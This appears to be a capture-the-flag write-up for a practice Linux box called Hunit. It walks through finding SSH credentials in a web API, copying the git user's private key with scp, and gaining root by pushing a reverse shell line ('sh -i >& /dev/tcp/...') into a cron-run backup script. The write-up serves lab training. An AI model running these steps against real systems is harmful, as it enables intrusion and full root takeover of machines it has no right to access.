---
Alias: Hunit
Date: 6/1/2022
Platform: Linux
Difficulty: Intermediate
Tags:
Status: Finished
IP: 
---

# {{Hunit}}


# Resolution summary
- Located a directory listed in webpage source code
- Directory showed SSH user credentials
- Found cronjob with backups.sh file running every 3 minutes
- Found git-server directory in SSH session 
- Git cloned the git server in tmp directory which made us able to review the backup.sh which was a placeholder file
- Found a user named git and found the ssh private key id_rsa file is readable and executable by user git
- Logged in with user git and found ssh private key and found it to be a git-shell
- Git cloned the server onto kali machine
- Modified the backup.sh file and input a reverse shell into the backup.sh file
- Prior to pushing the changes to master brang setup a netcat listener
- Pushed the changes and as the cronjob/backup.sh file runs every 3 minutes I waited and recieved a reverse shell as root in 3 minutes
## Improved skills
- Finding hidden directory on web page source code
- Git cloning server to kali and modifying files and pushing changes
- Git-shell commands
- Modifying cron jobs

## Used tools
- nmap
- gobuster

---

# Information Gathering
Scanned all TCP ports:
```bash

```

Enumerated open TCP ports:
```bash
8080
43022
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 8080  

#### -Navigated to http://192.168.143.125:8080 and found the following web page and clicked on a link of a user's hauiku on the web page and right clicked and clicked "view page source" and found it had directory "/api"

![](Images/Pasted%20image%2020221016220003.png)
![](Images/Pasted%20image%2020221017173943.png)

#### -Navigated to "/api" directory and found the following and clicked "raw data" and found  directory "/user":

![](Images/Pasted%20image%2020221017174047.png)

![](Images/Pasted%20image%2020221017174142.png)

#### -Navigated to directory "/user" and found user login "dademola" listed as an admin:

![](Images/Pasted%20image%2020221017174304.png)

---

# Exploitation
## Located user credentials in directory shown in websites source code

#### -As port 43022 was found earlier running on SSH I typed the following to login to ssh session with the found credentials above "ssh –p 43022 dademola@192.168.143.125" with password "ExplainSlowQuest110" and received shell:

![](Images/Pasted%20image%2020221017174428.png)

---

# Privilege Escalation
## Local Enumeration
#### -Ran "lse.sh" and found cron job "crontab.bak" running as root and was readable and found the below contents of "crontab.bak" which file "pull.sh" and "backups.sh" was running every 2 and 3 minutes:

![](Images/Pasted%20image%2020221017175014.png)
![](Images/Pasted%20image%2020221017175126.png)

#### -Searched more and found directory "git-server" and found it being owned by "git" user and was git backend files which are difficult to work with so I navigated to "/tmp" directory and typed "git clone file:///git-server/" to clone the server into the "/tmp" directory:

![](Images/Pasted%20image%2020221017175529.png)

![](Images/Pasted%20image%2020221017175722.png)

#### -Now we can review the contents of "backups.sh" file which shows as a place holder file:

![](Images/Pasted%20image%2020221017180046.png)

#### -Set up git identity by typing git config --global user.name "dademola" AND git config --global user.email "dademola@hunit.(none)"

![](Images/Pasted%20image%2020221017180308.png)

#### -Typed "echo "touch /tmp/gitscript-test" >> backups.sh" and "chmod +x backups.sh" to inject a test instruction into the "backups.sh" file and to make it executable:

![](Images/Pasted%20image%2020221017180606.png)

#### -But after receiving an error when trying to push the file onto the git-server and further investigation the server is owned by user "git":

#### -Found a user named "git" and found we have read and execute permissions on their ssh "id_rsa" file which is a private SSH Key:

![](Images/Pasted%20image%2020221017180818.png)

![](Images/Pasted%20image%2020221017180904.png)

#### -Navigate to my kali machine and typed "scp -P 43022 dademola@192.168.93.125:/home/git/.ssh/id_rsa ." to upload the private ssh key to my kali machine and "chmod 600" to set the correct permissions:

![](Images/Pasted%20image%2020221017185135.png)

## Lateral Movement vector
## Found private ssh key for user in SSH session

#### -Logged in to remote ssh session by typing "ssh -i id_rsa -p 43022 git@192.168.93.125" and found it to be a git-shell:

![](Images/Pasted%20image%2020221017185623.png)
#GitShell

#### -Since this is a git-shell we should be able to interact with the git repository

## Privilege Escalation vector
## Git-shell cron tab privilege escalation

#### -Typed "GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.93.125:/git-server" to clone git server onto my kali machine:

![](Images/Pasted%20image%2020221017191609.png)

#### -Navigated into git-server and typed [git config --global user.name "kali"] and [git config --global user.email "kali@kali.(none)"] to setup git identity:

![](Images/Pasted%20image%2020221017203812.png)

#### -Typed "echo "sh -i >& /dev/tcp/[kali IP]/8080 0>&1" >> backups.sh " to inject a reverse shell into the "backups.sh" file and typed "chmod +x to make it executable:

#### -Then typed "git add -A " and [git commit -m "pwn"] to commit the changes to the git-server:

![](Images/Pasted%20image%2020221017204016.png)
![](Images/Pasted%20image%2020221017204123.png)

#### -Prior to pushing the master branch to the git-server to place the reverse shell onto the git-server I started a netcat listener listening on port 8080 on my kali machine:

![](Images/Pasted%20image%2020221017204330.png)

#### -Then typed "GIT_SSH_COMMAND='ssh -i /home/kali/Downloads/ProvingGroundsBoxes/Hunit/id_rsa -p 43022' git push origin master" to push everything to the master branch on git-server onto remote machine:

![](Images/Pasted%20image%2020221017204550.png)

#### -As found previously the "/root/git-server/backups.sh" file runs every 3 minutes I waited about 3 minutes and received a root shell on my netcat listener:

![](Images/Pasted%20image%2020221017204714.png)

![](Images/Pasted%20image%2020221017204827.png)
#Git-serverCronTabScriptPrivilegeEscalation

---

# Trophy & Loot
user.txt

root.txt